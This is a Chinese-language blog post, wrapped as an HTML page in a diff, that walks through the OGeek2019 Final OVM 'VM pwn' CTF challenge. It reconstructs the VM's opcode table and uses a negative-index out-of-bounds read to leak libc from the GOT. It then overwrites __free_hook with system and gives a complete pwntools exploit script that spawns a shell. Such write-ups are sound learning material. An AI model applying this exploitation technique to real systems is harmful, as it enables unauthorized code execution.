@@ -1,0 +1,461 @@
+
+
+<!DOCTYPE html>
+<html lang="en" color-mode=light>
+<head>
+  <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no">
+  <meta http-equiv="X-UA-Compatible" content="ie=edge">
+  <title>VM pwn - ShouCheng</title>
+  <meta name="apple-mobile-web-app-capable" content="yes" />
+  <meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
+  <meta name="google" content="notranslate" />
+  
+  <meta name="description" content="前言第一次做VM pwn，虽然全程是跟着诸多大佬博客走...">
+  <meta name="author" content="ShouCheng">
+  <link rel="icon" href="/images/icons/favicon-16x16.png" type="image/png" sizes="16x16">
+  <link rel="icon" href="/images/icons/favicon-32x32.png" type="image/png" sizes="32x32">
+  <link rel="apple-touch-icon" href="/images/icons/apple-touch-icon.png" sizes="180x180">
+  <meta rel="mask-icon" href="/images/icons/stun-logo.svg" color="#333333">
+  
+    <meta rel="msapplication-TileImage" content="/images/icons/favicon-144x144.png">
+    <meta rel="msapplication-TileColor" content="#000000">
+  
+
+  
+<link rel="stylesheet" href="/css/style.css">
+
+
+  
+    
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1445822_r673sha78lq.css">
+
+  
+
+  
+    
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/fancybox/3.5.7/jquery.fancybox.min.css">
+
+  
+
+  
+    
+      
+        
+        
+<link rel="stylesheet" href="https://cdn.bootcss.com/highlight.js/9.18.1/styles/xcode.min.css" name="highlight-style" mode="light">
+
+      
+        
+        
+<link rel="stylesheet" href="https://cdn.bootcss.com/highlight.js/9.18.1/styles/solarized-dark.min.css" name="highlight-style" mode="dark">
+
+      
+  
+
+  <script>
+    var CONFIG = window.CONFIG || {};
+    var ZHAOO = window.ZHAOO || {};
+    CONFIG = {
+      isHome: false,
+      fancybox: true,
+      pjax: false,
+      lazyload: {
+        enable: true,
+        only_post: 'false',
+        loading: '[object Object]'
+      },
+      donate: {
+        enable: false,
+        alipay: '',
+        wechat: ''
+      },
+      galleries: {
+        enable: true
+      },
+      fab: {
+        enable: true,
+        always_show: false
+      },
+      carrier: {
+        enable: true
+      },
+      daovoice: {
+        enable: true
+      },
+      preview: {
+        background: {
+          default: '',
+          api: ''
+        },
+        motto: {
+          default: '总之岁月漫长，然而值得等待！',
+          typing: true,
+          api: 'https://v2.jinrishici.com/one.json',
+          data_contents: '["data","content"]'
+        },
+      },
+      qrcode: {
+        enable: true,
+        type: 'url',
+        image: '',
+      },
+      toc: {
+        enable: true
+      },
+      scrollbar: {
+        type: 'default'
+      },
+      notification: {
+        enable: true,
+        delay: 4500,
+        list: '',
+        page_white_list: '',
+        page_black_list: ''
+      },
+      search: {
+        enable: true,
+        path: '/search.xml'
+      }
+    }
+  </script>
+
+  
+
+  
+
+<meta name="generator" content="Hexo 5.4.0"></head>
+
+<body class="lock-screen">
+  <div class="loading"></div>
+  
+    
+
+
+  <nav class="navbar">
+    <div class="left">
+      
+        <i class="iconfont iconhome j-navbar-back-home"></i>
+      
+      
+        <i class="iconfont iconqrcode j-navbar-qrcode"></i>
+      
+      
+        <i class="iconfont iconmoono" id="color-toggle" color-toggle="light"></i>
+      
+      
+        <i class="iconfont iconsearch j-navbar-search"></i>
+      
+    </div>
+    <div class="center">VM pwn</div>
+    <div class="right">
+      <i class="iconfont iconmenu j-navbar-menu"></i>
+    </div>
+    
+      <div id="qrcode-navbar"></div>
+    
+  </nav>
+
+  
+  
+
+<nav class="menu">
+  <div class="menu-container">
+    <div class="menu-close">
+      <i class="iconfont iconbaseline-close-px"></i>
+    </div>
+    <ul class="menu-content"><li class="menu-item">
+        <a href="/ " class="underline "> 首页</a>
+      </li><li class="menu-item">
+        <a href="/galleries/ " class="underline "> 摄影</a>
+      </li><li class="menu-item">
+        <a href="/archives/ " class="underline "> 归档</a>
+      </li><li class="menu-item">
+        <a href="/tags/ " class="underline "> 标签</a>
+      </li><li class="menu-item">
+        <a href="/categories/ " class="underline "> 分类</a>
+      </li><li class="menu-item">
+        <a href="/about/ " class="underline "> 关于</a>
+      </li></ul>
+    
+      <div class="menu-copyright"><p>Powered by <a target="_blank" href="https://hexo.io">Hexo</a>  |  Theme - <a target="_blank" href="https://github.com/izhaoo/hexo-theme-zhaoo">zhaoo</a></p></div>
+    
+  </div>
+</nav>
+  <main id="main">
+  <div class="article-wrap">
+    <div class="row container">
+      <div class="col-xl-3"></div>
+      <div class="col-xl-6"><article class="article">
+  <div class="wrap">
+    <section class="head">
+  <img   class="lazyload" data-original="/images/theme/post-image.jpg" src="data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg=="  draggable="false">
+  <div class="head-mask">
+    <h1 class="head-title">VM pwn</h1>
+    <div class="head-info">
+      <span class="post-info-item"><i class="iconfont iconcalendar"></i>October 04, 2021</span>
+      
+      <span class="post-info-item"><i class="iconfont iconfont-size"></i>5256</span>
+    </div>
+  </div>
+</section>
+    <section class="main">
+      <section class="content">
+        <h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>第一次做VM pwn，虽然全程是跟着诸多大佬博客走的，但总得还是个里程碑，在pwn的路上走的更远了一些。pwn👶也想变成pwn👴，不知道这天还有多远~</p>
+<p>wp来源：</p>
+<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/A951860555/article/details/117214601?spm=1001.2014.3001.5501">https://blog.csdn.net/A951860555/article/details/117214601?spm=1001.2014.3001.5501</a></p>
+<p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/lemon629/p/13975686.html">https://www.cnblogs.com/lemon629/p/13975686.html</a></p>
+<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/seaaseesa/article/details/105862737">https://blog.csdn.net/seaaseesa/article/details/105862737</a></p>
+<p><a target="_blank" rel="noopener" href="https://zhuanlan.zhihu.com/p/257132453">https://zhuanlan.zhihu.com/p/257132453</a></p>
+<h2 id="OGeek2019-Final-OVM"><a href="#OGeek2019-Final-OVM" class="headerlink" title="[OGeek2019 Final]OVM"></a>[OGeek2019 Final]OVM</h2><p>题目来自buuoj</p>
+<p><img   class="lazyload" data-original="/2021/10/04/2021-10-04-VMpwn%E5%85%A5%E9%97%A8/image-20211004113441697.png" src="data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==" ><span class="image-caption">image-20211004113441697</span></p>
+<p>常规checksec一下，64位，stack没开</p>
+<p><img   class="lazyload" data-original="/2021/10/04/2021-10-04-VMpwn%E5%85%A5%E9%97%A8/image-20211005191907462.png" src="data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==" ><span class="image-caption">image-20211005191907462</span></p>
+<p>主函数的代码审计</p>
+<p><img   class="lazyload" data-original="/2021/10/04/2021-10-04-VMpwn%E5%85%A5%E9%97%A8/image-20211005191927756.png" src="data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==" ><span class="image-caption">image-20211005191927756</span></p>
+<p>fetch函数的话，取出pc指向的指令，并自动加1，指向下一条</p>
+<p><img   class="lazyload" data-original="/2021/10/04/2021-10-04-VMpwn%E5%85%A5%E9%97%A8/image-20211005192113608.png" src="data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==" ><span class="image-caption">image-20211005192113608</span></p>
+<p>execute函数的代码审计，下面是根据代码整合出来的指令表</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs assembly">instr  --&gt;  op | num1 | num2 | num3  4B 32bit<br>op:<br>0x10 --&gt; reg[num1] = unsigned_byte(instr)<br>0x20 --&gt; reg[num1] = (byte(instr) == 0)<br>0x30 --&gt; reg[num1] = memory[reg[num3]] --&gt; mov mem, reg<br>0x40 --&gt; memory[reg[num3]] = reg[num1] --&gt; mov reg, mem<br>0x50 --&gt; stack[sp++] = reg[num1] --&gt; push reg<br>0x60 --&gt; reg[num1] = stack[--sp] --&gt; pop reg<br>0x70 --&gt; reg[num1] = reg[num3] + reg[num2] --&gt; add<br>0x80 --&gt; reg[num1] = reg[num2] - reg[num3] --&gt; sub<br>0x90 --&gt; reg[num1] = reg[num3] &amp; reg[num2] --&gt; and<br>0xA0 --&gt; reg[num1] = reg[num3] | reg[num2] --&gt; or<br>0xB0 --&gt; reg[num1] = reg[num3] ^ reg[num2] --&gt; xor  <br>0xC0 --&gt; reg[num1] = reg[num2] &lt;&lt; reg[num3]--&gt; shl<br>0xD0 --&gt; reg[num1] = reg[num2] &gt;&gt; reg[num3]--&gt; shr<br>0XE0 and else --&gt; exit<br></code></pre></td></tr></table></figure>
+
+<p><img   class="lazyload" data-original="/2021/10/04/2021-10-04-VMpwn%E5%85%A5%E9%97%A8/image-20211005183901799-16334329637311.png" src="data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==" ><span class="image-caption">image-20211005183901799</span></p>
+<p><img   class="lazyload" data-original="/2021/10/04/2021-10-04-VMpwn%E5%85%A5%E9%97%A8/image-20211005191434825.png" src="data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==" ><span class="image-caption">image-20211005191434825</span></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs assembly">知识补充：<br>movsx 有符号扩展，并传送。通过符号进行判断，如果符号位是0，则扩展的全都是0，如果是1，则扩展的全都是1。而该题中的movsxd是一样的，可能是因为是从ecx拓展为rdx<br>movzx 无符号扩展，并传送。所以一般适用在无符号的小数值拷贝到大数值里面<br>两个指令扩展的位数都和目的操作寄存器的位数一致<br></code></pre></td></tr></table></figure>
+
+<p>结合汇编一起看，可以发现，数组下标没有禁止为负数的情况，所以是可以向上访问到got表，从而把函数地址放入寄存器中，获得函数地址。但是这边要注意，寄存器跟内存是4字节的，而泄露的地址是6字节的，、所以要用两个寄存器分别存放高四字节和低四字节</p>
+<p><img   class="lazyload" data-original="/2021/10/04/2021-10-04-VMpwn%E5%85%A5%E9%97%A8/image-20211005195005486.png" src="data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==" ><span class="image-caption">image-20211005195005486</span></p>
+<p><img   class="lazyload" data-original="/2021/10/04/2021-10-04-VMpwn%E5%85%A5%E9%97%A8/image-20211005195011712.png" src="data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==" ><span class="image-caption">image-20211005195011712</span></p>
+<p>然后就是退出execute时，会往之前申请的堆块里面写入内容，再释放掉。但是因为这个堆块的地址是存放在.bss上的，在上面的数组越界同样可以修改，所以可以改为free_hook - 0x8，改为这个是因为我们要释放得是一块含有/bin/sh的堆块，所以要先有位置填充/bin/sh，然后再写入system函数。</p>
+<p>声明：我下面的图都是忘了-0x8的，后面懒得再截图了</p>
+<p><img   class="lazyload" data-original="/2021/10/04/2021-10-04-VMpwn%E5%85%A5%E9%97%A8/image-20211005210317826.png" src="data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==" ><span class="image-caption">image-20211005210317826</span></p>
+<p>可以看见，一顿操作后，寄存器上确实存放了一个libc地址，计算与free_hook的偏移即可</p>
+<p><img   class="lazyload" data-original="/2021/10/04/2021-10-04-VMpwn%E5%85%A5%E9%97%A8/image-20211005211732444.png" src="data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==" ><span class="image-caption">image-20211005211732444</span></p>
+<p>然后通过0x10一个字节一个字节的加，最终改成free_hook</p>
+<p><img   class="lazyload" data-original="/2021/10/04/2021-10-04-VMpwn%E5%85%A5%E9%97%A8/image-20211005212732683.png" src="data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==" ><span class="image-caption">image-20211005212732683</span></p>
+<p>跟第一步一样，把free_hook地址写入comment</p>
+<p>然后就是输入/bin/sh以及system函数，即可getshell！</p>
+<p><img   class="lazyload" data-original="/2021/10/04/2021-10-04-VMpwn%E5%85%A5%E9%97%A8/image-20211005213743697.png" src="data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==" ><span class="image-caption">image-20211005213743697</span></p>
+<p>成功！</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#!usr/bin/env python </span><br><span class="hljs-comment">#coding=utf-8</span><br><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br>context(arch = <span class="hljs-string">&#x27;amd64&#x27;</span>,os = <span class="hljs-string">&#x27;linux&#x27;</span>,log_level = <span class="hljs-string">&#x27;debug&#x27;</span>)<br>elf = ELF(<span class="hljs-string">&quot;./pwn&quot;</span>)<br>libc = ELF(<span class="hljs-string">&quot;/home/shoucheng/glibc-all-in-one/libs/2.23-0ubuntu11.2_amd64/libc-2.23.so&quot;</span>)<br>libc = ELF(<span class="hljs-string">&quot;./libc-2.23.so&quot;</span>)<br>ld = ELF(<span class="hljs-string">&quot;/home/shoucheng/glibc-all-in-one/libs/2.23-0ubuntu11.2_amd64/ld-2.23.so&quot;</span>)<br>p = process(argv=[ld.path,elf.path],env=&#123;<span class="hljs-string">&quot;LD_PRELOAD&quot;</span> : libc.path&#125;)<br>p = remote(<span class="hljs-string">&quot;node4.buuoj.cn&quot;</span>,<span class="hljs-number">28420</span>)<br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">debug</span>():</span><br>	gdb.attach(p,<span class="hljs-string">&quot;b *main&quot;</span>)<br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">input_code</span>(<span class="hljs-params">op,num1,num2,num3</span>):</span><br>    code = (op&lt;&lt;<span class="hljs-number">24</span>) + (num1&lt;&lt;<span class="hljs-number">16</span>) + (num2&lt;&lt;<span class="hljs-number">8</span>) + num3<br>    p.sendline(<span class="hljs-built_in">str</span>(code))<br><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-string">instr  --&gt;  op | num1 | num2 | num3  4B 32bit</span><br><span class="hljs-string">op:</span><br><span class="hljs-string">0x10 --&gt; reg[num1] = unsigned_byte(instr)</span><br><span class="hljs-string">0x20 --&gt; reg[num1] = (byte(instr) == 0)</span><br><span class="hljs-string">0x30 --&gt; reg[num1] = memory[reg[num3]] --&gt; mov reg, mem</span><br><span class="hljs-string">0x40 --&gt; memory[reg[num3]] = reg[num1] --&gt; mov mem, reg</span><br><span class="hljs-string">0x50 --&gt; stack[sp++] = reg[num1] --&gt; push reg</span><br><span class="hljs-string">0x60 --&gt; reg[num1] = stack[--sp] --&gt; pop reg</span><br><span class="hljs-string">0x70 --&gt; reg[num1] = reg[num3] + reg[num2] --&gt; add</span><br><span class="hljs-string">0x80 --&gt; reg[num1] = reg[num2] - reg[num3] --&gt; sub</span><br><span class="hljs-string">0x90 --&gt; reg[num1] = reg[num3] &amp; reg[num2] --&gt; and</span><br><span class="hljs-string">0xA0 --&gt; reg[num1] = reg[num3] | reg[num2] --&gt; or</span><br><span class="hljs-string">0xB0 --&gt; reg[num1] = reg[num3] ^ reg[num2] --&gt; xor  </span><br><span class="hljs-string">0xC0 --&gt; reg[num1] = reg[num2] &lt;&lt; reg[num3]--&gt; shl</span><br><span class="hljs-string">0xD0 --&gt; reg[num1] = reg[num2] &gt;&gt; reg[num3]--&gt; shr</span><br><span class="hljs-string">0xE0 and else --&gt; exit</span><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br>p.sendlineafter(<span class="hljs-string">&quot;PCPC: &quot;</span>,<span class="hljs-string">&#x27;0&#x27;</span>)<br>p.sendlineafter(<span class="hljs-string">&quot;SP: &quot;</span>,<span class="hljs-string">&#x27;1&#x27;</span>)<br>p.sendlineafter(<span class="hljs-string">&quot;CODE SIZE: &quot;</span>,<span class="hljs-string">&#x27;18&#x27;</span>)<br>p.recvuntil(<span class="hljs-string">&quot;CODE: &quot;</span>)<br><span class="hljs-comment">#写入libc</span><br>input_code(<span class="hljs-number">0x10</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">26</span>)<br>input_code(<span class="hljs-number">0x80</span>,<span class="hljs-number">1</span>,<span class="hljs-number">1</span>,<span class="hljs-number">0</span>)<br>input_code(<span class="hljs-number">0x10</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">25</span>)<br>input_code(<span class="hljs-number">0x80</span>,<span class="hljs-number">2</span>,<span class="hljs-number">2</span>,<span class="hljs-number">0</span>)<br>input_code(<span class="hljs-number">0x30</span>,<span class="hljs-number">1</span>,<span class="hljs-number">0</span>,<span class="hljs-number">1</span>)<br>input_code(<span class="hljs-number">0x30</span>,<span class="hljs-number">2</span>,<span class="hljs-number">0</span>,<span class="hljs-number">2</span>) <span class="hljs-comment">#6</span><br><span class="hljs-comment">#修改libc</span><br>input_code(<span class="hljs-number">0x10</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">8</span>)<br>input_code(<span class="hljs-number">0x10</span>,<span class="hljs-number">3</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0x10</span>)<br>input_code(<span class="hljs-number">0xC0</span>,<span class="hljs-number">3</span>,<span class="hljs-number">3</span>,<span class="hljs-number">0</span>)<br>input_code(<span class="hljs-number">0x10</span>,<span class="hljs-number">4</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0xa0</span>)<br>input_code(<span class="hljs-number">0x70</span>,<span class="hljs-number">1</span>,<span class="hljs-number">1</span>,<span class="hljs-number">3</span>)<br>input_code(<span class="hljs-number">0x70</span>,<span class="hljs-number">1</span>,<span class="hljs-number">1</span>,<span class="hljs-number">4</span>) <span class="hljs-comment">#6</span><br><span class="hljs-comment">#修改comment</span><br>input_code(<span class="hljs-number">0x80</span>,<span class="hljs-number">3</span>,<span class="hljs-number">5</span>,<span class="hljs-number">0</span>)<br>input_code(<span class="hljs-number">0x10</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">7</span>)<br>input_code(<span class="hljs-number">0x80</span>,<span class="hljs-number">4</span>,<span class="hljs-number">5</span>,<span class="hljs-number">0</span>)<br>input_code(<span class="hljs-number">0x40</span>,<span class="hljs-number">1</span>,<span class="hljs-number">0</span>,<span class="hljs-number">3</span>)<br>input_code(<span class="hljs-number">0x40</span>,<span class="hljs-number">2</span>,<span class="hljs-number">0</span>,<span class="hljs-number">4</span>) <br>input_code(<span class="hljs-number">0xE0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>) <span class="hljs-comment">#6</span><br>p.recvuntil(<span class="hljs-string">&quot;R1: &quot;</span>)<br>addr1 = <span class="hljs-built_in">int</span>(p.recv(<span class="hljs-number">8</span>),<span class="hljs-number">16</span>)<br>p.recvuntil(<span class="hljs-string">&quot;R2: &quot;</span>)<br>addr2 = <span class="hljs-built_in">int</span>(p.recv(<span class="hljs-number">4</span>),<span class="hljs-number">16</span>)<br>addr = (addr2&lt;&lt;<span class="hljs-number">32</span>) + addr1 - <span class="hljs-number">0x3c67a0</span><br>log.info(<span class="hljs-string">&quot;libc_base: 0x%x&quot;</span> %addr)<br>p.recvuntil(<span class="hljs-string">&quot;HOW DO YOU FEEL AT OVM?\n&quot;</span>)<br>p.send(<span class="hljs-string">&quot;/bin/sh\x00&quot;</span> + p64(libc.sym[<span class="hljs-string">&#x27;system&#x27;</span>] + addr))<br><br>p.interactive()<br></code></pre></td></tr></table></figure>
+
+<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>所谓VM pwn，就是模拟虚拟机的底层运行机制，大逻辑上拥有内存、寄存器，内存细分还有堆栈等等，以及自己的一套指令集，所以如果就算碰到不是上面的给了符号表的，也可以通过这个大逻辑自己进行理解性的还原代码，使得代码更好阅读。这类型的pwn题难点更多就是在于代码逻辑的理解，知道指令集的操作，再找寻里面出现的漏洞，要具备十足的耐心，毕竟现在2021的题目肯定比上面复杂很多很多。</p>
+<p>然后呢在分析虚拟机实现了哪些指令时，可以从下面两个大方向入手：首先找到虚拟实现的内存以及寄存器，比如程序可能单独malloc几块内存用来当作寄存器或者栈空间，亦或者就用全局变量来实现；第二步就是读代码逻辑，分析指令。有字符串，可以直接根据提示的字符串识别；没有字符串，则根据指令<code>操作码</code>和<code>操作数</code>构成，操作数的个数还可分为一操作数指令、两操作数指令以及三操作数指令等概念加入到代码逻辑的阅读中，帮助我们快速分析和理解。</p>
+<p>最后在调用寄存器进行布局getshell时，最好是要把代码中的指令进行整合，就像上面整合的一样，这样可以在写脚本，迅速知道操作码的取值以及操作对象的值</p>
+<p>然后，加油！</p>
+
+      </section>
+      <section class="extra">
+        
+          <ul class="copyright">
+  
+    <li><strong>本文作者：</strong>ShouCheng</li>
+    <li><strong>本文链接：</strong><a href="http://example.com/2021/10/04/2021-10-04-VMpwn%E5%85%A5%E9%97%A8/index.html" title="http:&#x2F;&#x2F;example.com&#x2F;2021&#x2F;10&#x2F;04&#x2F;2021-10-04-VMpwn%E5%85%A5%E9%97%A8&#x2F;index.html">http:&#x2F;&#x2F;example.com&#x2F;2021&#x2F;10&#x2F;04&#x2F;2021-10-04-VMpwn%E5%85%A5%E9%97%A8&#x2F;index.html</a></li>
+    <li><strong>版权声明：</strong>本博客所有文章均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh" title="BY-NC-SA" target="_blank" rel="noopener">BY-NC-SA</a> 许可协议，转载请注明出处！</li>
+  
+</ul>
+        
+        
+        
+  <ul class="tag-list" itemprop="keywords"><li class="tag-list-item"><a class="tag-list-link" href="/tags/VMpwn/" rel="tag">VMpwn</a></li></ul> 
+
+        
+  <nav class="nav">
+    <a></a>
+    <a href="/2021/10/02/2021-10-02-2021%E8%93%9D%E5%B8%BD%E6%9D%AF/">2021蓝帽杯<i class="iconfont iconright"></i></a>
+  </nav>
+
+      </section>
+      
+        <section class="comments">
+  
+    <div class="btn" id="comments-btn">查看评论</div>
+  
+  
+</section>
+      
+    </section>
+  </div>
+</article></div>
+      <div class="col-xl-3">
+        
+          
+  <aside class="toc-wrap">
+    <h3 class="toc-title">文章目录：</h3>
+    <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%89%8D%E8%A8%80"><span class="toc-text">前言</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#OGeek2019-Final-OVM"><span class="toc-text">[OGeek2019 Final]OVM</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%80%BB%E7%BB%93"><span class="toc-text">总结</span></a></li></ol>
+  </aside>
+
+        
+      </div>
+    </div>
+  </div>
+</main>
+  
+
+<footer class="footer">
+  <div class="footer-social"><a 
+        href="tencent://message/?Menu=yes&uin=1145020611 "
+        target="_blank"
+        class="footer-social-item"
+        onMouseOver="this.style.color= '#12B7F5'" 
+        onMouseOut="this.style.color='#33333D'">
+          <i class="iconfont  iconQQ "></i>
+      </a><a 
+        href="javascript:; "
+        target="_blank"
+        class="footer-social-item"
+        onMouseOver="this.style.color= '#09BB07'" 
+        onMouseOut="this.style.color='#33333D'">
+          <i class="iconfont  iconwechat-fill "></i>
+      </a><a 
+        href="https://www.instagram.com/izhaoo/ "
+        target="_blank"
+        class="footer-social-item"
+        onMouseOver="this.style.color= '#DA2E76'" 
+        onMouseOut="this.style.color='#33333D'">
+          <i class="iconfont  iconinstagram "></i>
+      </a><a 
+        href="https://shoucheng3.github.io "
+        target="_blank"
+        class="footer-social-item"
+        onMouseOver="this.style.color= '#9f7be1'" 
+        onMouseOut="this.style.color='#33333D'">
+          <i class="iconfont  icongithub-fill "></i>
+      </a><a 
+        href="mailto:1145020611@qq.com "
+        target="_blank"
+        class="footer-social-item"
+        onMouseOver="this.style.color=#FF3B00" 
+        onMouseOut="this.style.color='#33333D'">
+          <i class="iconfont  iconmail"></i>
+      </a></div>
+  
+    <div class="footer-copyright"><p>Powered by <a target="_blank" href="https://hexo.io">Hexo</a>  |  Theme - <a target="_blank" href="https://github.com/izhaoo/hexo-theme-zhaoo">zhaoo</a></p></div>
+  
+</footer>
+  
+      <div class="fab fab-plus">
+    <i class="iconfont iconplus"></i>
+  </div>
+  
+    <div class="fab fab-daovoice">
+      <i class="iconfont iconcomment"></i>
+    </div>
+  
+  
+    <a href="https://support.qq.com/product/325288# app_id" target="_blank">
+      <div class="fab fab-tencent-chao">
+        <i class="iconfont iconcomment"></i>
+      </div>
+    </a>
+  
+  <div class="fab fab-up">
+    <i class="iconfont iconcaret-up"></i>
+  </div>
+  
+  
+  
+    
+<script src="/js/color-mode.js"></script>
+
+  
+  
+    <div class="search">
+  <div class="search-container">
+    <div class="search-close">
+      <i class="iconfont iconbaseline-close-px"></i>
+    </div>
+    <div class="search-input-wrapper">
+      <i class="search-input-icon iconfont iconsearch"></i>
+      <input class="search-input" type="search" id="search-input" placeholder="Search..." autofocus autocomplete="off"
+        autocorrect="off" autocapitalize="off">
+    </div>
+    <div class="search-output" id="search-output"></div>
+  </div>
+</div>
+  
+</body>
+
+<script src="https://cdn.bootcss.com/jquery/3.4.1/jquery.min.js"></script>
+
+
+
+  
+<script src="https://cdn.bootcdn.net/ajax/libs/jquery.lazyload/1.9.1/jquery.lazyload.min.js"></script>
+
+
+
+
+  
+<script src="https://cdnjs.cloudflare.com/ajax/libs/fancybox/3.5.7/jquery.fancybox.min.js"></script>
+
+
+
+
+
+
+  
+<script src="https://cdn.bootcdn.net/ajax/libs/jquery.qrcode/1.0/jquery.qrcode.min.js"></script>
+
+
+
+
+<script src="/js/utils.js"></script>
+<script src="/js/script.js"></script>
+
+
+
+
+
+  
+
+<script>
+  (function (i, s, o, g, r, a, m) {
+    i["DaoVoiceObject"] = r;
+    i[r] = i[r] || function () {
+      (i[r].q = i[r].q || []).push(arguments)
+    }, i[r].l = 1 * new Date();
+    a = s.createElement(o), m = s.getElementsByTagName(o)[0];
+    a.async = 1;
+    a.src = g;
+    a.charset = "utf-8";
+    m.parentNode.insertBefore(a, m)
+  })(window, document, "script", "https://widget.daovoice.io/widget/0f81ff2f.js", "daovoice")
+  daovoice('init', {
+    app_id: "3abd194f# app_id"
+  }, {
+    launcher: {
+      disableLauncherIcon: true,
+    },
+  });
+  daovoice('update');
+</script>
+
+
+
+  <script>
